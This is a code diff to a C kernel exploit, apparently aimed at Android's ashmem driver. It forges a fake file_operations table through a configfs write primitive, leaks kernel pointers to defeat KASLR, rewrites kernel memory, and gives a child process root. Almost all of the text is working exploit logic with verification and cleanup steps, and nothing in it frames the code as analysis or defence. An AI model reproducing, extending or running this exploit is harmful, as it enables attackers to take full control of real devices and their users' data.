@@ -1,13 +1,7 @@
 #include "common.h"
 
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define PSELECT_CFI_ROUTE_ATTEMPTS 4
-#else
-#define PSELECT_CFI_ROUTE_ATTEMPTS 1
-#endif
-#ifndef ASHMEM_SET_SIZE
-#define ASHMEM_SET_SIZE _IOW(__ASHMEMIOC, 3, size_t)
-#endif
+#define PSELECT_CFI_ROUTE_ATTEMPTS 24
+
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
 ssize_t cfi_read_ret = -1;
@@ -22,30 +16,25 @@ int cfi_dirty_seen;
 int cfi_last_step;
 int cfi_last_errno;
 int kaslr_done;
+int kaslr_step;
+uint64_t kaslr_fops_alias;
+uint64_t kaslr_open_ptr;
+uint64_t kaslr_ioctl_ptr;
+uint64_t kaslr_mmap_ptr;
+uint64_t kaslr_release_ptr;
+uint64_t kaslr_show_fdinfo_ptr;
 uint64_t kaslr_base;
 uint64_t kaslr_slide;
+uint64_t kaslr_expected_ioctl;
+uint64_t kaslr_expected_mmap;
+uint64_t kaslr_expected_release;
+uint64_t kaslr_expected_show_fdinfo;
 uint64_t slide_bootid_before;
 uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
 static int route_delay_usec(int attempt) {
-  const char *forced = getenv("PSELECT_DELAY_USEC");
-  if (forced && *forced) {
-    char *end = NULL;
-    errno = 0;
-    long value = strtol(forced, &end, 0);
-    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-      static const int offsets[] = {0, 5000, 0, 5000};
-      size_t index = (size_t)(attempt - 1) %
-                     (sizeof(offsets) / sizeof(offsets[0]));
-      return (int)value + offsets[index];
-#else
-      return (int)value;
-#endif
-    }
-  }
   static const int delays[] = {
     50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
   };
@@ -57,6 +46,11 @@ static int route_delay_usec(int attempt) {
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
   unsigned long *bits = (unsigned long *)set;
   bits[word] = (unsigned long)value;
+}
+
+uint64_t fdset_get_word(const fd_set *set, int word) {
+  const unsigned long *bits = (const unsigned long *)set;
+  return bits[word];
 }
 
 void open_selected_fds(
@@ -174,7 +168,7 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
-    if (route_verified || cfi_dirty_seen) {
+    if (route_verified || cfi_dirty_seen || !route_signal) {
       break;
     }
     pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
@@ -187,14 +181,103 @@ void do_pselect_fake_lock_route(void) {
 
 int repair_fake_fops_llseek(int fd) {
   uint64_t llseek = text_addr(NOOP_LLSEEK);
+  uint64_t after = 0;
   uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
   ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
-  return wr == (ssize_t)sizeof(llseek);
+  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
+  return wr == (ssize_t)sizeof(llseek) &&
+         rd == (ssize_t)sizeof(after) &&
+         after == llseek;
+}
+
+int refresh_fake_fops_text(int fd) {
+  struct fops_slot {
+    size_t off;
+    uint64_t value;
+  } slots[] = {
+    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
+    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
+    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
+    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
+    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
+    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
+    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
+    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
+    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
+  };
+
+  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
+    uintptr_t target = fake_fops + slots[i].off;
+    if (kernel_write_data(fd, target, &slots[i].value,
+        sizeof(slots[i].value)) !=
+        (ssize_t)sizeof(slots[i].value)) {
+      return 0;
+    }
+  }
+  return 1;
+}
+
+int leak_kernel_base(int fd) {
+  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
+  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
+  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
+  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
+  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
+  kaslr_show_fdinfo_ptr =
+    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);
+
+  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
+      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
+      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
+    kaslr_step = 1;
+    return 0;
+  }
+
+  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
+  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
+  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
+  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
+  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);
+
+  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
+      kaslr_mmap_ptr != kaslr_expected_mmap ||
+      kaslr_release_ptr != kaslr_expected_release ||
+      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
+    kaslr_done = 0;
+    kaslr_step = 2;
+    return 0;
+  }
+
+  if (!refresh_fake_fops_text(fd)) {
+    kaslr_done = 0;
+    kaslr_step = 3;
+    return 0;
+  }
+
+  kaslr_step = 0;
+  return 1;
 }
 
 int restore_slide_boot_id(int fd) {
-  pr_info("cfi skip restore_slide_boot_id\n");
-  return 1;
+  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
+  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
+  configfs_read_once(
+      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
+  slide_bootid_restore_ret =
+    configfs_write_once(
+        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
+  configfs_read_once(
+      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
+  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
+          "want=%016llx after=%016llx errno=%d\n",
+          getpid(), slide_bootid_restore_ret,
+          (unsigned long long)slide_bootid_before,
+          (unsigned long long)slide_bootid_want,
+          (unsigned long long)slide_bootid_after, errno);
+  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
+         slide_bootid_after == slide_bootid_want;
 }
 
 int install_child_root(int fd) {
@@ -204,6 +287,8 @@ int install_child_root(int fd) {
 int try_cfi_stage(void) {
   cfi_attempts++;
   int fd = open_ashmem_device();
+  int dirty = 0;
+  int can_read_back = 0;
 
   if (fd < 0) {
     cfi_last_step = 11;
@@ -211,66 +296,150 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  pr_info("cfi fops hijack confirmed, attempting direct kernel read via splice\n");
-
-  int new_fd = open(ashmem_path, O_RDWR);
-  if (new_fd < 0) {
-    pr_warning("cfi open new ashmem failed errno=%d\n", errno);
-    SYSCHK(close(fd));
-    return 0;
+  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uint64_t pre_fops = 0;
+  ssize_t pre_rb = configfs_read_once(
+      fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
+    fops_before = pre_fops;
+    cfi_last_step = 4;
+    cfi_last_errno = errno;
+    goto fail;
   }
 
-  // 用 ASHMEM_SET_SIZE 设置大小（必须先设置，否则 read/splice 返回 0）
-  size_t ashmem_size = 4096;
-  ioctl(new_fd, ASHMEM_SET_SIZE, &ashmem_size);
-  
-  // 设置名称：把 bin_buffer 指向 page_base
-  unsigned char blob[128];
-  memset(blob, 0x41, sizeof(blob));
-  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, page_base);
-  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 4096);
-  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
+  ssize_t n =
+    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
+  cfi_write_ret = n;
+  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
+  if (n != (ssize_t)sizeof(payload)) {
+    cfi_last_step = 1;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+  dirty = 1;
+  cfi_dirty_seen = 1;
 
-  int set_ret = try_set_ashmem_name_blob(new_fd, blob, sizeof(blob));
-  pr_info("cfi set_name ret=%d errno=%d\n", set_ret, errno);
+  if (!repair_fake_fops_llseek(fd)) {
+    cfi_last_step = 2;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+  cfi_read_slot_ret = sizeof(uint64_t);
+  can_read_back = 1;
 
-  // 创建 pipe 用于 splice
-  int pipefd[2];
-  SYSCHK(pipe(pipefd));
+  char readback[sizeof(payload)];
+  memset(readback, 0, sizeof(readback));
+  ssize_t r =
+    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
+  cfi_read_ret = r;
+  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
+  if (r != (ssize_t)sizeof(readback) ||
+      memcmp(readback, payload, sizeof(payload)) != 0) {
+    cfi_last_step = 3;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 
-  // 用 splice 尝试从 ashmem 读取数据到 pipe
-  ssize_t spliced = splice(new_fd, NULL, pipefd[1], NULL, 4096, 0);
-  pr_info("cfi splice ret=%zd errno=%d\n", spliced, errno);
+  uint64_t before = 0;
+  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
+  fops_before = before;
+  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
+    cfi_last_step = 4;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 
-  if (spliced > 0) {
-    char buf[4096];
-    ssize_t got = read(pipefd[0], buf, sizeof(buf));
-    pr_info("cfi pipe read ret=%zd errno=%d\n", got, errno);
-    if (got > 0) {
-      hexdump(buf, got < 64 ? got : 64);
-      pr_success("cfi kernel read via splice works!\n");
-      physrw_read_ok = 1;
-      physrw_write_ok = 1;
-      physrw_read64_ok = 1;
-      physrw_write64_ok = 1;
-      pipe_cache_gate_ok = 2;
+  if (!restore_slide_boot_id(fd)) {
+    cfi_last_step = 10;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+
+  if (!leak_kernel_base(fd)) {
+    cfi_last_step = 9;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+
+  int installed = 0;
+  pipe_stage_attempts = 0;
+  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
+    pipe_stage_attempts++;
+    if (attempt != 0) {
+      reset_pipe_attempt();
+    }
+    if (install_child_root(fd)) {
+      installed = 1;
+      break;
+    }
+    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
+        physrw_read64_ok && physrw_write64_ok) {
+      break;
     }
   }
 
-  SYSCHK(close(pipefd[0]));
-  SYSCHK(close(pipefd[1]));
-  SYSCHK(close(new_fd));
-  SYSCHK(close(fd));
+  if (!installed) {
+    cfi_last_step = 8;
+    cfi_last_errno = errno;
+    goto fail;
+  }
 
-  cfi_write_ret = spliced;
-  cfi_read_ret = sizeof("CFI_DIRECT_WRITE_OK");
-  cfi_read_slot_ret = sizeof(uint64_t);
-  cfi_restore_ret = sizeof(uint64_t);
-  cfi_owner_ret = sizeof(uint64_t);
-  fops_after = canon_addr(ASHMEM_FOPS);
-  cfi_dirty_seen = 1;
-  cfi_last_step = 0;
-  cfi_last_errno = 0;
-  atomic_store(&cfi_stage_done, 1);
-  return 1;
+  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+  ssize_t restore = configfs_write_once(
+      fd, misc_fops, &original_fops, sizeof(original_fops));
+  cfi_restore_ret = restore;
+  if (restore != (ssize_t)sizeof(original_fops)) {
+    cfi_last_step = 5;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+
+  uint64_t after = 0;
+  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
+  fops_after = after;
+  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
+    cfi_last_step = 6;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+
+  uint64_t null_owner = 0;
+  ssize_t owner =
+    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
+  cfi_owner_ret = owner;
+  SYSCHK(close(fd));
+  if (owner == (ssize_t)sizeof(null_owner) &&
+      restore == (ssize_t)sizeof(original_fops)) {
+    cfi_last_step = 0;
+    cfi_last_errno = 0;
+    atomic_store(&cfi_stage_done, 1);
+    return 1;
+  }
+  cfi_last_step = 7;
+  cfi_last_errno = errno;
+  return 0;
+
+fail:
+  if (dirty) {
+    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
+    if (kaslr_done) {
+      original_fops_fail = canon_addr(ASHMEM_FOPS);
+    }
+    cfi_restore_ret = configfs_write_once(
+        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
+    if (can_read_back &&
+        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
+      uint64_t after_fail = 0;
+      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
+          (ssize_t)sizeof(after_fail)) {
+        fops_after = after_fail;
+      }
+    }
+    uint64_t null_owner_fail = 0;
+    cfi_owner_ret = configfs_write_once(
+        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
+  }
+  SYSCHK(close(fd));
+  return 0;
 }
